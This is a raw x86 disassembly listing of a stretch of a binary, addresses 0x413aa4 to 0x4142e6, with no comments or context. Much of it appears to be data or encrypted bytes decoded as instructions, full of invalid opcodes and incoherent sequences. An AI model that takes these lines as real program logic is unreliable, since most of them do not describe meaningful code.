  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	(bad)  
  413ba9:	xor    eax,0x68720043
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	je     0x413bf6
  413bf6:	inc    ebx
  413bf7:	add    BYTE PTR [ecx+0x49],bl
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    dl,ch
  413c45:	adc    BYTE PTR [ebx+0x0],al
  413c48:	add    BYTE PTR [eax],al
  413c4a:	add    BYTE PTR [eax],al
  413c4c:	inc    esp
  413c4d:	add    BYTE PTR [esi+0x0],al
  413c50:	imul   eax,DWORD PTR [eax],0x4a006f
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	push   esp
  413f01:	ins    BYTE PTR es:[edi],dx
  413f02:	add    BYTE PTR [esi+0xd1dc],0x5
  413f09:	add    DWORD PTR [eax],eax
  413f0b:	add    BYTE PTR [ecx-0x7c2a7a0a],al
  413f11:	xchg   edi,eax
  413f12:	adc    ah,bl
  413f14:	jmp    0x413f38
  413f16:	inc    ebx
  413f17:	cmp    al,BYTE PTR [eax+0x45743768]
  413f1d:	jo     0x413f0f
  413f1f:	cs jnp 0x413f3f
  413f22:	xlat   BYTE PTR ds:[ebx]
  413f23:	mov    eax,0x9c65a157
  413f28:	xor    ch,dh
  413f2a:	xor    eax,0xd9d83bac
  413f2f:	adc    ebp,DWORD PTR [edx]
  413f31:	fst    st(5)
  413f33:	or     ah,BYTE PTR [ecx+ecx*2+0x15]
  413f37:	sbb    al,0x1b
  413f39:	add    eax,0x60b4073e
  413f3e:	xor    DWORD PTR [ebp-0x65],esp
  413f41:	add    esp,DWORD PTR [edi+0xe]
  413f44:	xor    eax,0xda3ad7e6
  413f49:	add    BYTE PTR [ebx+ebp*1+0x35],bl
  413f4d:	xor    esp,DWORD PTR [ebp+0x46]
  413f50:	jne    0x413f66
  413f52:	xor    edi,ebp
  413f54:	lahf   
  413f55:	pop    ebp
  413f56:	out    dx,al
  413f57:	rol    BYTE PTR [ecx],1
  413f59:	mov    DWORD PTR [edi],eax
  413f5b:	iret   
  413f5c:	mov    esi,DWORD PTR [edi-0x4d00043c]
  413f62:	loope  0x413f5a
  413f64:	das    
  413f65:	fdiv   DWORD PTR ds:[edx+ebx*1-0x33ede950]
  413f6d:	ret    
  413f6e:	lods   al,BYTE PTR ds:[esi]
  413f6f:	data16 mov dl,0xc0
  413f72:	scas   al,BYTE PTR es:[edi]
  413f73:	leave  
  413f74:	out    dx,al
  413f75:	(bad)  
  413f76:	cdq    
  413f77:	add    eax,0x9c63f1e
  413f7c:	mov    DWORD PTR [edi+0x7a56f4b5],edx
  413f82:	push   ebx
  413f83:	sub    DWORD PTR [esi-0x221310be],edx
  413f89:	sahf   
  413f8a:	in     eax,dx
  413f8b:	jb     0x413f71
  413f8d:	add    eax,0x599271ac
  413f92:	out    dx,al
  413f93:	add    bh,BYTE PTR [edi+ebx*1+0x59c018d3]
  413f9a:	pushaw 
  413f9c:	enter  0x6b3c,0x8
  413fa0:	jnp    0x413fe8
  413fa2:	or     ecx,DWORD PTR [edi]
  413fa4:	mov    edx,0x75357529
  413fa9:	out    dx,al
  413faa:	das    
  413fab:	push   0x35cf5b64
  413fb0:	cmp    eax,0xb0da8d3d
  413fb5:	ins    DWORD PTR es:[edi],dx
  413fb6:	mov    esp,0x8aaa3249
  413fbb:	shl    BYTE PTR [ecx-0x6dcb5fb4],1
  413fc1:	iret   
  413fc2:	cld    
  413fc3:	stc    
  413fc4:	in     eax,dx
  413fc5:	cmp    ebx,DWORD PTR [ecx+0x3a2d8787]
  413fcb:	jo     0x413fcd
  413fcd:	dec    esi
  413fce:	and    eax,0x2c1acaad
  413fd3:	xchg   ecx,eax
  413fd4:	ret    0xcec8
  413fd7:	clc    
  413fd8:	push   cs
  413fd9:	inc    edx
  413fda:	xchg   ecx,eax
  413fdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fdc:	jecxz  0x413fa8
  413fde:	push   es
  413fdf:	mov    al,ds:0xa3cde831
  413fe4:	pushf  
  413fe5:	add    BYTE PTR [esi-0x35d0d268],al
  413feb:	bnd jg 0x413fce
  413fee:	dec    ebx
  413fef:	cmp    ecx,DWORD PTR [esi+0x64]
  413ff2:	mov    bh,0x56
  413ff4:	fnstcw WORD PTR [esp+ecx*2+0x0]
  413ff8:	and    al,0x8d
  413ffa:	xchg   edx,eax
  413ffb:	push   0xffffff96
  413ffd:	sti    
  413ffe:	xor    eax,0x18309cc8
  414003:	add    ebp,DWORD PTR [edx-0x3cc20f3]
  414009:	les    ecx,FWORD PTR [eax-0x6d]
  41400c:	xor    DWORD PTR [ebp+0xe0b17f],esi
	...
  414072:	add    BYTE PTR [eax],al
  414074:	pop    edx
  414075:	ficom  DWORD PTR [esi+0x60]
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x2820:0x41d52e96
  414083:	stos   BYTE PTR es:[edi],al
  414084:	loope  0x414058
  414086:	add    BYTE PTR [eax],al
  414088:	add    eax,0x21000001
  41408d:	xchg   esp,ebp
  41408f:	das    
  414090:	loope  0x4140e4
  414092:	cld    
  414093:	dec    edi
  414094:	pop    eax
  414095:	and    BYTE PTR [edi+0x46],ah
  414098:	cwde   
  414099:	scas   al,BYTE PTR es:[edi]
  41409a:	fistp  QWORD PTR [eax+0x5]
  41409d:	sbb    eax,0x35da7008
  4140a2:	sbb    al,0xf1
  4140a4:	sahf   
  4140a5:	into   
  4140a6:	and    DWORD PTR [ebx],edx
  4140a8:	jg     0x4140fe
  4140aa:	fs jmp 0x8d6:0x17318c5a
  4140b2:	cmp    eax,0xce8f098f
  4140b7:	stc    
  4140b8:	dec    ecx
  4140b9:	in     al,0xc6
  4140bb:	(bad)  
  4140bd:	pushf  
  4140be:	mov    ch,0x92
  4140c0:	push   cs
  4140c1:	push   ecx
  4140c2:	jp     0x4140a2
  4140c4:	nop
  4140c5:	sbb    ch,bh
  4140c7:	fsubr  DWORD PTR [edx*8+0x12170df0]
  4140ce:	icebp  
  4140cf:	test   al,0x1a
  4140d1:	clc    
  4140d2:	push   ecx
  4140d3:	pop    ecx
  4140d4:	ins    DWORD PTR es:[edi],dx
  4140d5:	inc    ebx
  4140d6:	retf   0x5c83
  4140d9:	pop    edx
  4140da:	out    0x1e,eax
  4140dc:	fdivrp st(5),st
  4140de:	bound  edx,QWORD PTR [ebp-0xb11857d]
  4140e4:	inc    ebp
  4140e5:	xchg   esi,eax
  4140e6:	popf   
  4140e7:	push   ebx
  4140e8:	(bad)  
  4140e9:	sti    
  4140ea:	xchg   ecx,eax
  4140eb:	sbb    al,dh
  4140ed:	xchg   edx,eax
  4140ee:	pushf  
  4140ef:	jae    0x414150
  4140f1:	or     dh,dl
  4140f3:	pusha  
  4140f4:	shr    DWORD PTR [eax],1
  4140f6:	clc    
  4140f7:	fsubr  DWORD PTR [edx-0x42]
  4140fa:	xchg   ebp,eax
  4140fb:	push   edi
  4140fc:	adc    dh,BYTE PTR [edi+eax*4]
  4140ff:	mov    ecx,DWORD PTR [eax+0x68a0631a]
  414105:	dec    edx
  414106:	call   0x60a1:0x340931b0
  41410d:	aas    
  41410e:	xchg   esp,eax
  41410f:	out    0x35,eax
  414111:	mov    esp,0xd8b169f6
  414116:	dec    edi
  414117:	icebp  
  414118:	dec    ebx
  414119:	cmp    dh,BYTE PTR [ebx]
  41411b:	cdq    
  41411c:	aas    
  41411d:	push   ebp
  41411e:	fiadd  DWORD PTR [edi-0x39]
  414121:	pop    esi
  414122:	outs   dx,DWORD PTR ds:[esi]
  414123:	mov    cl,0x15
  414125:	or     ebp,DWORD PTR [ebp+edx*2+0x1b144310]
  41412c:	push   ds
  41412d:	hlt    
  41412e:	cmp    al,bl
  414130:	js     0x414104
  414132:	das    
  414133:	push   ss
  414134:	add    al,0x99
  414136:	mov    ebx,0x806c21a1
  41413b:	jecxz  0x41411a
  41413d:	ret    
  41413e:	(bad)  
  414140:	lock cs jnp 0x4140e5
  414144:	(bad)  
  414145:	adc    ebx,ecx
  414147:	inc    ebx
  414148:	pusha  
  414149:	push   ebp
  41414a:	arpl   dx,di
  41414c:	(bad)  
  41414d:	dec    ecx
  41414e:	sub    ah,BYTE PTR ds:0xf2a0f5f7
  414154:	stos   BYTE PTR es:[edi],al
  414155:	enter  0x5af0,0xc3
  414159:	stos   BYTE PTR es:[edi],al
  41415a:	inc    esi
  41415b:	mov    eax,0x4d799838
  414160:	ja     0x414129
  414162:	dec    esi
  414163:	mov    DWORD PTR [edi-0x5a3bc620],esi
  414169:	outs   dx,BYTE PTR ds:[esi]
  41416a:	push   eax
  41416b:	xor    DWORD PTR [ecx+0x72],esp
  41416e:	mov    edi,0x4dbd6ef0
  414173:	and    esi,DWORD PTR [eax]
  414175:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  414177:	je     0x4141a4
  414179:	rcl    BYTE PTR [ecx+0x60],1
  41417c:	adc    ah,BYTE PTR [esi+eax*8-0x30]
  414180:	dec    edi
  414181:	or     BYTE PTR [ebx-0x47578a20],0xde
  414188:	aaa    
  414189:	cdq    
  41418a:	xchg   BYTE PTR [eax+0x3f],ch
  41418d:	das    
  41418e:	push   ss
  41418f:	mov    ah,0xc5
	...
  4141f1:	add    BYTE PTR [eax],al
  4141f3:	add    BYTE PTR [edx],al
  4141f5:	adc    al,BYTE PTR [ecx]
  4141f7:	mov    ds:0xb3a2b311,eax
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	jnp    0x41420e
  414202:	dec    esp
  414203:	dec    ebp
  414204:	out    0xd3,al
  414206:	add    BYTE PTR [eax],al
  414208:	add    eax,0x58000001
  41420d:	lods   eax,DWORD PTR ds:[esi]
  41420e:	push   0x40fc8832
  414213:	mov    bh,0x83
  414215:	xor    ah,BYTE PTR [ecx+0x5]
  414218:	or     dl,BYTE PTR [ebp+eiz*8+0x2f]
  41421c:	scas   al,BYTE PTR es:[edi]
  41421d:	test   DWORD PTR ds:0xea6ce57d,0x4166c8bc
  414227:	addr16 loope 0x4141ef
  41422a:	adc    edi,DWORD PTR [edx+0x606023d8]
  414230:	(bad)  ds:0x58ee25ae
  414236:	icebp  
  414237:	and    DWORD PTR [ebx-0x7e0d682a],edi
  41423d:	mov    edx,edi
  41423f:	pop    ss
  414240:	leave  
  414241:	(bad)  
  414242:	imul   DWORD PTR [edi]
  414244:	mov    ah,0x43
  414246:	xor    eax,0x45c5583
  41424b:	mov    dh,0x8e
  41424d:	jge    0x4141fe
  41424f:	out    0x8c,eax
  414251:	call   0x2b59:0x7e649031
  414258:	push   eax
  414259:	in     eax,dx
  41425a:	into   
  41425b:	ret    
  41425c:	jo     0x414216
  41425e:	out    dx,eax
  41425f:	inc    ebp
  414260:	lock mov DWORD PTR [esi-0x5d],ecx
  414264:	push   cs
  414265:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414266:	fnstenv [ecx-0x50]
  414269:	jmp    0x414299
  41426b:	jb     0x414232
  41426d:	dec    esp
  41426e:	int3   
  41426f:	std    
  414270:	out    dx,eax
  414271:	sub    DWORD PTR [edi-0x398e619e],ebx
  414277:	or     ch,BYTE PTR [eax]
  414279:	push   0x1ab3a284
  41427e:	add    BYTE PTR [edx],dl
  414280:	inc    sp
  414282:	cmp    DWORD PTR [eax+ebx*2-0xcd3ec91],esi
  414289:	adc    eax,0x1e94c473
  41428e:	sbb    DWORD PTR [ebx],edi
  414290:	push   cs
  414291:	jo     0x41428e
  414293:	inc    edx
  414294:	pop    ecx
  414295:	mov    ds:0x6253d19f,eax
  41429a:	jp     0x4142b7
  41429c:	sbb    esp,DWORD PTR [esi+esi*1]
  41429f:	out    0x1f,al
  4142a1:	not    DWORD PTR [eax-0x4f]
  4142a4:	ficom  WORD PTR [ecx+0x14]
  4142a7:	inc    esi
  4142a8:	scas   al,BYTE PTR es:[edi]
  4142a9:	scas   al,BYTE PTR es:[edi]
  4142aa:	shl    bh,0x4a
  4142ad:	retf   
  4142ae:	and    cl,BYTE PTR [ecx]
  4142b0:	loope  0x414266
  4142b2:	jns    0x41429b
  4142b4:	mov    edx,0x958f9d5
  4142b9:	push   0xef46471e
  4142be:	add    DWORD PTR [edx+0x3e],esp
  4142c1:	push   ds
  4142c2:	jp     0x4142a6
  4142c4:	mov    ds:0xbccc3ca3,eax
  4142c9:	pusha  
  4142ca:	addr16 add al,0x6c
  4142cd:	mov    bl,BYTE PTR [edx+0x5d19cf51]
  4142d3:	inc    DWORD PTR [eax-0xf]
  4142d6:	lock test BYTE PTR [ebx],ah
  4142d9:	cld    
  4142da:	mov    cl,0x52
  4142dc:	and    al,0x2f
  4142de:	std    
  4142df:	in     eax,0x10
  4142e1:	mov    esi,0x635f749a
  4142e6:	neg    ah
